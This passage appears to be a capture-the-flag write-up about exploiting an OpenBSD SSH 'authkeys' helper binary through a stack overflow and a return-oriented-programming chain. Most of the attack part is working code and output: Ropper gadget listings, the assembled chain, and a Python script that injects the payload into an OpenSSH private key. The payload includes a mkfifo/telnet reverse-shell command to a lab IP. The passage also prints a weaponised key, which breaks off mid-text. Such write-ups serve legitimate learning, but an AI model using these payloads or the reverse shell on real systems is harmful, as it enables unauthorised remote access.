   613 w        CALL  mprotect(0x1147c9917000,0x1000,0x1<PROT_READ>)
   613 w        RET   mprotect 0
   613 w        CALL  munmap(0x1147c9917000,0x1000)
   613 w        RET   munmap 0
   613 w        CALL  exit(0)
```

I see a whole lot of calls to mprotect so I guess OpenBSD does not really use the NX flag from the binary. I did not dig any deeper tha googling a bit and found out that DEP in OpenBSD is called W^X https://en.wikipedia.org/wiki/W%5EX No code execution from the stack seems reasonable in a modern OS so let´s fall back to try some Return Oriented Programming!!!


### Findind ROP-gadgets with Ropper

A good place to start is to see what dynamic linked libraries this executable is using.

```shell

foo# ldd authkeys                                                                                                                     
authkeys:
not a dynamic executable
```

Ehh, none. This is a stripped binary and no dynamic loading of libs. Let´s go on and see if Ropper can find any useful gadgets inside.

```asm
┌──(root💀c974b36640ee)-[/]
└─# ropper -f authkeys 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x000000000040037d: adc byte ptr [rdx], al; mov ebx, 0xf02d0ff3; ret; 
0x000000000040036f: adc cl, 0xe8; ret; 
0x00000000004003c1: add al, ch; or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x000000000040037e: add bh, byte ptr [rbx - 0xfd2f00d]; ret; 
0x0000000000400360: add byte ptr [rax + 0x31], cl; ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x00000000004003c6: add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; 
0x00000000004003c6: add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; ret; 
0x00000000004003c4: add byte ptr [rax], al; add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; 
0x00000000004003c4: add byte ptr [rax], al; add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; ret; 
0x00000000004003c0: add byte ptr [rax], al; call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c5: add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c5: add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x000000000040035f: add byte ptr [rax], al; xor rax, rax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x00000000004003ca: add byte ptr [rax], al; xor rdi, rdi; syscall; 
0x00000000004003ca: add byte ptr [rax], al; xor rdi, rdi; syscall; ret; 
0x00000000004003c8: add dword ptr [rax], eax; add byte ptr [rax], al; xor rdi, rdi; syscall; 
0x00000000004003c8: add dword ptr [rax], eax; add byte ptr [rax], al; xor rdi, rdi; syscall; ret; 
0x000000000040035e: add eax, dword ptr [rax]; add byte ptr [rax + 0x31], cl; ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x00000000004003c2: call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c2: call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x0000000000400381: cvtps2pi mm6, xmm0; ret; 
0x0000000000400380: cvtss2si esi, xmm0; ret; 
0x0000000000400399: dec dword ptr [rax + 0x31]; leave; ret; 
0x0000000000400377: fcomp st(0), st(0); ret; 
0x0000000000400394: mov eax, 0xffffffff; xor rcx, rcx; ret; 
0x00000000004003c7: mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c7: mov eax, 1; xor rdi, rdi; syscall; ret; 
0x000000000040037f: mov ebx, 0xf02d0ff3; ret; 
0x000000000040037a: mov ecx, 0x2100ff3; mov ebx, 0xf02d0ff3; ret; 
0x0000000000400368: mov edi, esi; pop rdx; ret; 
0x0000000000400393: mov rax, -1; xor rcx, rcx; ret; 
0x0000000000400367: mov rdi, rsi; pop rdx; ret; 
0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
0x000000000040037c: movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
0x000000000040036d: not al; adc cl, 0xe8; ret; 
0x00000000004003c3: or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c3: or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x000000000040036a: pop rdx; ret; 
0x0000000000400363: ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x0000000000400376: sbb dh, 0xd0; ret; 
0x0000000000400370: shr eax, 1; ret; 
0x0000000000400366: test byte ptr [rax - 0x77], 0xf7; pop rdx; ret; 
0x0000000000400373: xor cl, 0xe0; sbb dh, 0xd0; ret; 
0x000000000040036c: xor dh, 0xd0; adc cl, 0xe8; ret; 
0x0000000000400362: xor eax, eax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x000000000040039b: xor ecx, ecx; ret; 
0x00000000004003cd: xor edi, edi; syscall; 
0x00000000004003cd: xor edi, edi; syscall; ret; 
0x0000000000400365: xor esi, esi; mov rdi, rsi; pop rdx; ret; 
0x0000000000400361: xor rax, rax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x000000000040039a: xor rcx, rcx; ret; 
0x00000000004003cc: xor rdi, rdi; syscall; 
0x00000000004003cc: xor rdi, rdi; syscall; ret; 
0x0000000000400364: xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x000000000040039c: leave; ret; 
0x000000000040028a: ret; 
0x00000000004003cf: syscall; 
0x00000000004003cf: syscall; ret; 
```

This is 64-bit and the calling convention for syscall is rax, rdi, rsi, rdx and so on so these are the registers I need to get hold of. There´s a pop rdx just before the ret that could start our rop-chain so we are in control of rip and rdx at this time. Since the authkeys is supposed to return a valid pubkey my intention here was to take controlof the program and print a valid key which I also did but later I relaized that there´s just not enough space to send the key so I will spare you that and go for the reverse shell at once.

There´s a whole bunch of gadgets there but no obvious ways to get hold of the registers that we need. Let´s remove stuff that can not be used and focus on what we have. First of all I removed everything that was manipulating memory directly or by offset or that used registers that I was not interested with. This is what I ended up with.

```asm
0x0000000000400380: cvtss2si esi, xmm0; ret; 
0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
0x000000000040037c: movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
0x000000000040036d: not al; adc cl, 0xe8; ret; 
0x000000000040036a: pop rdx; ret; 
0x0000000000400367: mov rdi, rsi; pop rdx; ret
0x0000000000400370: shr eax, 1; ret; 
0x00000000004003cf: syscall; ret; 
0x00000000004003c7: mov eax, 1; xor rdi, rdi; syscall; ret;
```

It was not this easy: I actually stared at that list for a whole day before my heureka moment. I rememberd from my electronics and digital logic classes that not and shr kan be used to produce numbers like a flip flop register. So not al and shr eax,1 could probably help me to control rax. I can use pop rdx to fill rdx from the stack and then I should be able to use movss xmm0, dword ptr [rdx] to control rsi and rsi can me moved to rdi. What caused me problems here was the mmx instructions that I was not familiar with so ignored them for a long time.

But let´s start with what we want to do. This is bit of the syscall table for OpenbBSD:

```c
57	STD		{ int sys_symlink(const char *path, const char *link); }
58	STD		{ ssize_t sys_readlink(const char *path, char *buf, size_t count); }
59	STD		{ int sys_execve(const char *path, char * const *argp, char * const *envp); }
60	STD		{ mode_t sys_umask(mode_t newmask); }
61	STD		{ int sys_chroot(const char *path); }
62	STD		{ int sys_getfsstat(struct statfs *buf, size_t bufsize, int flags); }
63	STD		{ int sys_statfs(const char *path, struct statfs *buf); }
```

We want to use the syscall 59 called sys_execve to execute a shell command. That call has 3 parameters. *path is a pointer to a string with our shell comannd. argp is a pointer to an array of pointers that points to strings that are the arguments to our shell command. And *envp is a pointer to an array of pointers pointing to strings with new environment variables. So we would like to accomplish this:

```c
rax = 59
rsi = '/bin/sh'
rdi = ['/bin/sh', '-c', 'reverse shell', 0x0000000000000000]
rdx = []
```

First of all lets set  up a few things. This program decodes a base64 string on the stack. There´s about 768 bytes reserved for this but bad handling makes it possible to overwrite the ret pointer on the stack frame by using a string longer than 768. That makes us take control of the program. But the decoded string is also copied from the stack to a reserved memory area at 0x6010c0. This memory area is 768 bytes long and no bug there so any overflow like on the stack will not reach this area.

So we will use this area to put our strings and other data so that it´s available from a predictable address space. It will look like this:

```asm
0x6010da:        "/bin/sh\0"
0x6010e2:        "-c\0"
0x6010e5:        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 192.168.23.2 4444 > /tmp/f\0"

0x601159:       0x000000004ac021b4 ; this is the floating point representation of 0x6010da
0x601161:       0x000000004ac022d2 ; this is the floating point representation of 0x601169

0x601169:       0x00000000006010da ; this is ['/bin/sh', '-c', 'rm /tmp/f;mkfifo']
0x601171:       0x00000000006010e2 ; 
0x601179:       0x00000000006010e5 ;  
0x601181:       0x0000000000000000 ;
```

There´s some addresss there as floating point numbers. This has to do with the available gadgets that was using floatingpoint. I used this site https://binary-system.base-conversion.ro/convert-real-numbers-from-decimal-system-to-32bit-single-precision-IEEE754-binary-floating-point.php to calculate what numbers to put on these addresses. But now we start with rax. To construct a rop chain that puts 59 into rax I used these gadgets. I you want to know more about how that works you should try it out in a programmer friendly calculator that has xor or no and shr available (xor al, xff is the same as not al). 

```asm
0x0000000000601161: 
0x000000000040036d: not al; adc cl, 0xe8; ret; 
0x0000000000400370: shr eax, 1; ret; 
0x000000000040036d: not al; adc cl, 0xe8; ret; 
0x0000000000400370: shr eax, 1; ret; 
0x0000000000400370: shr eax, 1; ret; 
0x0000000000400370: shr eax, 1; ret; 
0x000000000040036d: not al; adc cl, 0xe8; ret; 
0x0000000000400370: shr eax, 1; ret; 
0x0000000000400370: shr eax, 1; ret; 
```

Now we want to put the address of a nul terminated string '/bin/sh' in rdi. The xmm0 is a 128 bit mmx register. The instruction movss xmm0, dword ptr [rdx] moves a floating point number from the address rdx points to into xmm0, cvtss2si esi, xmm0 then moves that into rsi and it´s no longer a floating point number. At last we move the number  from rsi to rdi and the pop rdx again. We already have 0x601161 in rdx since there was a pop just before our rop-chain starts. We must end this rop chain by a pop of 0x601159 into rdx to prepare for the next block.

```asm
0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
0x0000000000400380: cvtss2si esi, xmm0; ret; 
0x0000000000400367: mov rdi, rsi; pop rdx; ret
0x0000000000601159:
```

Let´s do the same thing again but this time setup rsi.

```asm
0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
0x0000000000400380: cvtss2si esi, xmm0; ret; 
```

And now we just pop 0x601181 into rdx so that we do not force new env

```asm
0x000000000040036a: pop rdx; ret; 
0x0000000000601181: 
```

At this time we should have all the registers set up like rax = 59, rsi = '/bin/sh', rdi = ['/bin/sh', '-c', 'reverse shell', 0x0000000000000000], rdx = []. So let´s do a syscall and after that we use gadget from the program to exit clean with return code 0.

```asm
0x00000000004003cf: syscall; ret; 
0x00000000004003c7: mov eax, 1; xor rdi, rdi; syscall; ret;
```

At his time a was kind of exhausted. What worked in gdb stopped working as soon as you change a character at the wrong place or even enabled disabled breakpoints. I can´t guide you through that hell cause it took me many days and was about to go insane and I never really figured it out. So for now just trust me that when we put together this payload later it will work. I have no idea what the box makers did with the code to make it such a hell. It has something to do with the bas64 decoding and alignment in some way. Let´s not care about that for now but take a step back and see how we could send our payload all the way via ssh.

## Delivering the payload via ssh

First of all we need to find out what is going through to the authkeys. Let´s look again at our log.

```shell
foo# cat /tmp/authkeys.log                                                                                                            
SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio /root ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCl0+qwM4wPRIbGv5nCqpe3CmqzsDytNiMSGoKwv2HJOuSJouhwNjq8lDyKcBfhKiTjhLrJtg4vHeiU/tW0tMxLrL/tgbzGADY9O1F9huawswYq3h0rC+3nAiWE84F4Dqp1iq1+FqubkyxPMuY468BjO7YSQUJw57/3vbY5taxZqQp/n7mE62n5NQmfu2j/jVem2fdJtKS7uhqeANEU3DBCEgblyP9H5XUb312/EpOG/zD/8O8c2FXQPvZuhzKXYDh/YFn46Vul7pORH/YLWKvc63bos/SAHgukMM6FpAaOJxRlIqxPpAKziBymsEGZwVDU4URGx9+/9Bt+qsAUWfgcG3AVvo/iGpg0CaVrswXT/vN3Woyg5mhkVBIuhXgRpu9EtID+8mNJLYnApz/M7Xz22Ldyds2nLB9EjX6Bx2G539Zj6OyfFGFmEpaAh3Da/ooaxiJR6vI5J1y9mm4jyog5mHEfpj5r2bNpbqUQ6RpbzA/IhJBH5FyaQDeIZS3mKZ8=
```

Can we find this pattern "AAAAB3NzaC1yc2EAAAADAQABAAABgQCl0+qwM4wPRIbGv5nCqpe3C2" somewhere in our key pair?

```shell
┌──(root💀c974b36640ee)-[/]
└─# grep -i -nHo "AAAAB3NzaC1yc2EAAAADAQABAAABgQCl0" id_rsa.*
id_rsa.pub:1:AAAAB3NzaC1yc2EAAAADAQABAAABgQCl0
```

Yes, there it is. It´s the public key part. So now we need to find out a way to put our payload into the public key part of the id_rsa file. After some googling I found this site https://coolaj86.com/articles/the-openssh-private-key-format/ there´s a very simple and straight forward description of the file format that looks like this:

```config
"openssh-key-v1"0x00    # NULL-terminated "Auth Magic" string
32-bit length, "none"   # ciphername length and string
32-bit length, "none"   # kdfname length and string
32-bit length, nil      # kdf (0 length, no kdf)
32-bit 0x01             # number of keys, hard-coded to 1 (no length)
32-bit length, sshpub   # public key in ssh format
    32-bit length, keytype
    32-bit length, pub0
    32-bit length, pub1
32-bit length for rnd+prv+comment+pad
    64-bit dummy checksum?  # a random 32-bit int, repeated
    32-bit length, keytype  # the private key (including public)
    32-bit length, pub0     # Public Key parts
    32-bit length, pub1
    32-bit length, prv0     # Private Key parts
    ...                     # (number varies by type)
    32-bit length, comment  # comment string
    padding bytes 0x010203  # pad to blocksize (see notes below)
```

Aftersome testing back and forth for hours I realised that the ssh-client in OpenBSD complains with an error if I try to change the public key part. The same happens under Windows, but guess what. When I tried in Kali it works. We will have to tunnel our ssh connection via attended but that´s not a problem. I also discovered that Windows ssh program uses a diffrent field than Kali. But the one we will use here is the pub1 under sshpub section. So i wrote a simple program in python to handle this. 

```python
import base64
from pwn import *

f = open("id_rsa", "rb")
try:

    header = f.readline()
    body = ''
    line = ''
    
    while True:
        line = f.readline()
        if 'OPENSSH' in str(line):
            break;
        else:
            body = body + line.decode('utf-8').replace('\r\n', '')
    footer = line;

    opensshkey = base64.b64decode(body)

    i = 0
    magic = opensshkey[i:15]
    print(magic.decode('utf-8'))
    i = 15

    cipher_name_length = int.from_bytes(opensshkey[i:i+4], byteorder='big')
    print(cipher_name_length)
    i = i + 4
    cipher_name = opensshkey[i:i+cipher_name_length]
    print(cipher_name.decode('utf-8'))
    i = i + cipher_name_length
    kdf_name_length = int.from_bytes(opensshkey[i:i+4], byteorder='big')
    i = i + 4
    kdf_name = opensshkey[i:i+kdf_name_length]
    print(kdf_name.decode('utf-8'))
    i = i + kdf_name_length

    kdf_length = int.from_bytes(opensshkey[i:i+4], byteorder='big')
    i = i + 4

    number_of_keys = int.from_bytes(opensshkey[i:i+4], byteorder='big')
    print(number_of_keys)
    i = i + 4

    pub_key_length = int.from_bytes(opensshkey[i:i+4], byteorder='big')
    print(pub_key_length)
    i = i + 4 

    pub_key_type_length = int.from_bytes(opensshkey[i:i+4], byteorder='big')
    print(pub_key_type_length)
    i = i + 4

    pub_key_type = opensshkey[i:i+pub_key_type_length]
    print(pub_key_type.decode('utf-8'))
    i = i + pub_key_type_length

    pub_key_length = int.from_bytes(opensshkey[i:i+4], byteorder='big')
    print(pub_key_length)
    i = i + 4 + pub_key_length

    pub_key_length = int.from_bytes(opensshkey[i:i+4], byteorder='big')
    print(pub_key_length)
    i = i + 4 

    newsshkey = opensshkey[0:i]
    
    head = b'AAAA'
    head  += b"""/bin/sh\x00-c\x00rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 192.168.2.103 4444 > /tmp/f\x00                              """                              
    head += b"\xb4\x21\xc0\x4a\x00\x00\x00\x00\xd2\x22\xc0\x4a\x00\x00\00\00" 
    head += b"\xda\x10\x60\x00\x00\x00\x00\x00\xe2\x10\x60\x00\x00\x00\x00\x00\xe5\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
    head += cyclic((746-len(head)))
    
    payload = head + b"\x59\x11\x60\x00\x00\x00\x00\x00" +  b"\x6d\x03\x40\x00\x00\x00\x00\x00\x70\x03\x40\x00\x00\x00\x00\x00\x6d\x03\x40\x00\x00\x00\x00\x00\x70\x03\x40\x00\x00\x00\x00\x00\x70\x03\x40\x00\x00\x00\x00\x00\x70\x03\x40\x00\x00\x00\x00\x00\x6d\x03\x40\x00\x00\x00\x00\x00\x70\x03\x40\x00\x00\x00\x00\x00\x70\x03\x40\x00\x00\x00\x00\x00" + b"\x7b\x03\x40\x00\x00\x00\x00\x00\x80\x03\x40\x00\x00\x00\x00\x00\x67\x03\x40\x00\x00\x00\x00\x00\x61\x11\x60\x00\x00\x00\x00\x00"+ b"\x7b\x03\x40\x00\x00\x00\x00\x00\x80\x03\x40\x00\x00\x00\x00\x00" + b"\x6a\x03\x40\x00\x00\x00\x00\x00\x81\x11\x60\x00\x00\x00\x00\x00" + b"\xcf\x03\x40\x00\x00\x00\x00\x00" + b"\xc7\x03\x40\x00\x00\x00\x00\x00"
    buffer = cyclic(pub_key_length-len(payload))

    newsshkey += payload
    newsshkey += buffer

    print("""r $(echo "SHA256:2gDy3KjRmpeTksiCFdpH6QA24haGouyCgmg64M8Nyg4 /root ssh-rsa """ + base64.b64encode(newsshkey[i-4-7-4-4-3:i+1025]).decode('utf-8') + """") """)

    i = i + pub_key_length

    newsshkey += opensshkey[i:len(opensshkey)]
    
    b = base64.b64encode(newsshkey)

    print("-----BEGIN OPENSSH PRIVATE KEY-----")
    for i in range(0, len(b), 70):
        print(b[i:i+70].decode('utf-8') )
    print("-----END OPENSSH PRIVATE KEY-----")

finally:
    f.close()
```

This is absolutley not my proudest moment in code... :) but at this time I had been doing this 4-8 hours ewvery day for three weeks. This code reads our id_rsa file and injects our payload at the correct place and then prints a new id_rsa file that can be used against the target. So if you run the program on an id_rsa key it will print something like this:

```base64
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAEFwAAAAdzc2gtcn
NhAAAAAwEAAQAABAFBQUFBL2Jpbi9zaAAtYwBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtj
YXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXx0ZWxuZXQgMTkyLjE2OC4yLjEwMyA0NDQ0ID
4gL3RtcC9mACAgICAgICAgICAgICAgICAgICAgICAgICAgICAgILQhwEoAAAAA0iLASgAA
AADaEGAAAAAAAOIQYAAAAAAA5RBgAAAAAAAAAAAAAAAAAGFhYWFiYWFhY2FhYWRhYWFlYW
FhZmFhYWdhYWFoYWFhaWFhYWphYWFrYWFhbGFhYW1hYWFuYWFhb2FhYXBhYWFxYWFhcmFh
YXNhYWF0YWFhdWFhYXZhYWF3YWFheGFhYXlhYWF6YWFiYmFhYmNhYWJkYWFiZWFhYmZhYW
JnYWFiaGFhYmlhYWJqYWFia2FhYmxhYWJtYWFibmFhYm9hYWJwYWFicWFhYnJhYWJzYWFi
dGFhYnVhYWJ2YWFid2FhYnhhYWJ5YWFiemFhY2JhYWNjYWFjZGFhY2VhYWNmYWFjZ2FhY2
hhYWNpYWFjamFhY2thYWNsYWFjbWFhY25hYWNvYWFjcGFhY3FhYWNyYWFjc2FhY3RhYWN1
YWFjdmFhY3dhYWN4YWFjeWFhY3phYWRiYWFkY2FhZGRhYWRlYWFkZmFhZGdhYWRoYWFkaW
FhZGphYWRrYWFkbGFhZG1hYWRuYWFkb2FhZHBhYWRxYWFkcmFhZHNhYWR0YWFkdWFhZHZh
YWR3YWFkeGFhZHlhYWR6YWFlYmFhZWNhYWVkYWFlZWFhZWZhYWVnYWFlaGFhZWlhYWVqYW
Fla2FhZWxhYWVtYWFlbmFhZW9hYWVwYWFlcWFhZXJhYWVzYWFldGFhZXVhYWV2YWFld2Fh
ZXhhYWV5YWFlemFhZmJhYWZjYWFmZGFhZmVhYWZmYWFmZ2FhZmhhYWZpYWFmamFhZmthYW
ZsYWFmbWFhZm5hYWZvYWFmcGFhZnFhYVkRYAAAAAAAbQNAAAAAAABwA0AAAAAAAG0DQAAA
AAAAcANAAAAAAABwA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAew
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
